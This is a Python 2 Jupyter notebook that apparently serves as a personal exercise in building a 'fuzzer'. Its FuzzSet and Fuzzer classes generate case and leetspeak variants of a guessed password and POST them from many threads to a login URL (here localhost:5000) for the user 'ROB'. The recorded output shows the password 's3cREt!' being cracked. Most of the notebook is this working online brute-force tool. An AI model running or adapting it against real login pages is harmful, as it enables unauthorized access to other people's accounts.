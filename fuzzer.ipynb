{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "class FuzzSet(object):\n",
    "    \"\"\" Set of Strings to add as input to Fuzzer \"\"\"\n",
    "    _min_length = 0\n",
    "\n",
    "    def __init__(self, length, valid_chars, case_sensitive=False):\n",
    "        assert len(valid_chars) > 0\n",
    "        self.length = length\n",
    "        self.valid_chars = valid_chars\n",
    "        self.case_sensitive = case_sensitive\n",
    "\n",
    "        if type(self.length) == list:\n",
    "            self._min_length = min(self.length)\n",
    "        else:\n",
    "            self._min_length = self.length\n",
    "\n",
    "        self._init_sequence = [self.valid_chars[0] for char in range(self._min_length)]\n",
    "        self._current_sequence = self._init_sequence\n",
    "        self._create_generator()\n",
    "        self._current_count = 0\n",
    "\n",
    "    def _create_generator(self):\n",
    "        output = self.chain()\n",
    "        if type(self.length) == list:\n",
    "            temp_generators = []\n",
    "            for val in self.length:\n",
    "                temp_generators.append(self._product(val))\n",
    "            for gen in temp_generators:\n",
    "                output = self.chain(output, gen)\n",
    "            self._generator = output\n",
    "        else:\n",
    "            self._generator = self._product(self.length)\n",
    "    \n",
    "    def _product(self, length):\n",
    "        final = [[]]\n",
    "        l = length\n",
    "        groups = [list(self.valid_chars)] * l\n",
    "        for i in groups:\n",
    "            final = [x+[y] for x in final for y in i]\n",
    "        for k in final:\n",
    "            yield ''.join(k)\n",
    "\n",
    "    def generate_charset(self, num_values):\n",
    "        stop_value = self._current_count + num_values\n",
    "        while self._current_count < stop_value:\n",
    "            self._current_count += 1\n",
    "            print next(self._generator)\n",
    "\n",
    "    def next_charset(self):\n",
    "        try:\n",
    "            self._current_charset = next(self._generator)\n",
    "            return self._current_charset\n",
    "        except StopIteration:\n",
    "            return False\n",
    "\n",
    "    def current_charset(self):\n",
    "        return self._current_charset\n",
    "\n",
    "    def reset_generator(self):\n",
    "        self._create_generator()\n",
    "\n",
    "    def __repr__(self):\n",
    "        return \"FUZZSET: {length: %s, chars: \\\"%s\\\"}\" %(self.length, str(self.valid_chars))\n",
    "\n",
    "    @staticmethod\n",
    "    def cycle(iterable):\n",
    "        # cycle('ABCD') --> A B C D A B C D A B C D ...\n",
    "        saved = []\n",
    "        for element in iterable:\n",
    "            yield element\n",
    "            saved.append(element)\n",
    "        while saved:\n",
    "            for element in saved:\n",
    "                  yield element\n",
    "\n",
    "    @staticmethod\n",
    "    def chain(*iterables):\n",
    "        for it in iterables:\n",
    "            for element in it:\n",
    "                yield element\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "class Fuzzer(object):\n",
    "    \"\"\" This is where you collect your Fuzz Sets\"\"\"\n",
    "    theAnswer = ''\n",
    "\n",
    "    def __init__(self, url):\n",
    "        self.url = url\n",
    "        self._fuzzset = []\n",
    "        self._fuzz_product = None\n",
    "    \n",
    "    def __repr__(self):\n",
    "        return 'FUZZER CONTAINING: %s' %(self._fuzzset)\n",
    "\n",
    "    def add_fuzzset(self, fuzzset):\n",
    "        assert isinstance(fuzzset, FuzzSet)\n",
    "        self._fuzzset.append(fuzzset)\n",
    "        self._completed = [False for _ in range(len(self._fuzzset))]\n",
    "        self._fuzz_product = locked_iterator(self.product(*[fuzz._generator for fuzz in self._fuzzset]))\n",
    "    \n",
    "    def show_fuzzset(self):\n",
    "        print self._fuzzset\n",
    "    \n",
    "    @staticmethod\n",
    "    def product(*args):\n",
    "        pools = [tuple(pool) for pool in args] * 1 # repeat\n",
    "        result = [[]]\n",
    "        for pool in pools:\n",
    "            result = [x+[y] for x in result for y in pool]\n",
    "        for prod in result:\n",
    "            yield tuple(prod)\n",
    "\n",
    "    def generate_fuzzable(self):\n",
    "        try:\n",
    "            return ''.join(next(self._fuzz_product))\n",
    "        except StopIteration:\n",
    "            return False\n",
    "    \n",
    "    def send_request(self, threads=10):\n",
    "        import Queue\n",
    "        import requests\n",
    "        from threading import Thread\n",
    "        import time\n",
    "        q = Queue.Queue()\n",
    "        def build_queue():\n",
    "            for _ in range(threads*10):\n",
    "                q.put(self.generate_fuzzable())\n",
    "\n",
    "        def try_pw():\n",
    "            while not q.empty() and ThreadsWithAStopPattern.continueThreading:\n",
    "                pw = q.get()\n",
    "                if pw == False:\n",
    "                    return False\n",
    "                new_pw = self.generate_fuzzable()\n",
    "                q.put(new_pw)\n",
    "                r = requests.post(self.url, data={'username': 'ROB', 'password': pw})\n",
    "                q.task_done()\n",
    "                if r.status_code == 200:\n",
    "                    Fuzzer.theAnswer = pw\n",
    "                    ThreadsWithAStopPattern.continueThreading = False\n",
    "                    raise Exception('Password is: ' + pw)\n",
    "            return 'FAILED TO FIND PASSWORD'\n",
    "        build_queue()\n",
    "        for i in range(threads): # aka number of threadtex\n",
    "            t1 = ThreadsWithAStopPattern(target = try_pw) # target is the above function\n",
    "            t1.start() # start the thread\n",
    "        while ThreadsWithAStopPattern.continueThreading == True:\n",
    "            continue\n",
    "        return self.theAnswer\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "import threading\n",
    "\n",
    "class ThreadsWithAStopPattern(threading.Thread):\n",
    "    \"\"\" This is a thread that also allows for a class variable\n",
    "        to be reachable by all threads \"\"\"\n",
    "    \n",
    "    allThreads = []\n",
    "    continueThreading = True\n",
    "\n",
    "    def __init__(self, target):\n",
    "        super(ThreadsWithAStopPattern, self).__init__(target=target)\n",
    "        self.allThreads.append(self)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "class locked_iterator(object):\n",
    "    \"\"\"Locks an iterator/generator by serializing the call to the next\n",
    "       method \"\"\"\n",
    "\n",
    "    def __init__(self, it):\n",
    "        self.it = it\n",
    "        self.lock = threading.Lock()\n",
    "\n",
    "    def __iter__(self):\n",
    "        return self\n",
    "\n",
    "    def next(self):\n",
    "        with self.lock:\n",
    "            return self.it.next()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "a = FuzzSet(1, 'Ss')\n",
    "b = FuzzSet(1, 'Ee3')\n",
    "c = FuzzSet(1, 'cC')\n",
    "d = FuzzSet(1, 'rR')\n",
    "e = FuzzSet(1, 'eE3')\n",
    "f = FuzzSet(1, 'tT')\n",
    "g = FuzzSet(1, '!')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": false,
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "fuzzy = Fuzzer('http://localhost:5000/login')\n",
    "fuzzy.add_fuzzset(a)\n",
    "fuzzy.add_fuzzset(b)\n",
    "fuzzy.add_fuzzset(c)\n",
    "fuzzy.add_fuzzset(d)\n",
    "fuzzy.add_fuzzset(e)\n",
    "fuzzy.add_fuzzset(f)\n",
    "fuzzy.add_fuzzset(g)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": false,
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Exception in thread Thread-13:\n",
      "Traceback (most recent call last):\n",
      "  File \"/usr/local/Cellar/python/2.7.12/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 801, in __bootstrap_inner\n",
      "    self.run()\n",
      "  File \"/usr/local/Cellar/python/2.7.12/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 754, in run\n",
      "    self.__target(*self.__args, **self.__kwargs)\n",
      "  File \"<ipython-input-2-1536e18798c7>\", line 59, in try_pw\n",
      "    raise Exception('Password is: ' + pw)\n",
      "Exception: Password is: s3cREt!\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'s3cREt!'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "fuzzy.send_request(10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "\"\"\"some example code for generators\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def permutations_with_repetition(s):\n",
    "    base = len(s)\n",
    "    for n in range(base ** base):\n",
    "        yield \"\".join(s[n // base**(base-d-1) % base] for d in range(base))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def cycle(iterable):\n",
    "    # cycle('ABCD') --> A B C D A B C D A B C D ...\n",
    "    saved = []\n",
    "    for element in iterable:\n",
    "        yield element\n",
    "        saved.append(element)\n",
    "    while saved:\n",
    "        for element in saved:\n",
    "              yield element\n",
    "\n",
    "def chain(*iterables):\n",
    "    # chain('ABC', 'DEF') --> A B C D E F\n",
    "    for it in iterables:\n",
    "        for element in it:\n",
    "            yield element\n",
    "            \n",
    "def product(chars, length):\n",
    "    final = [[]]\n",
    "    l = length\n",
    "    groups = [list(chars)] * l\n",
    "    for i in groups:\n",
    "        final = [x+[y] for x in final for y in i]\n",
    "    for k in final:\n",
    "        yield ''.join(k)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
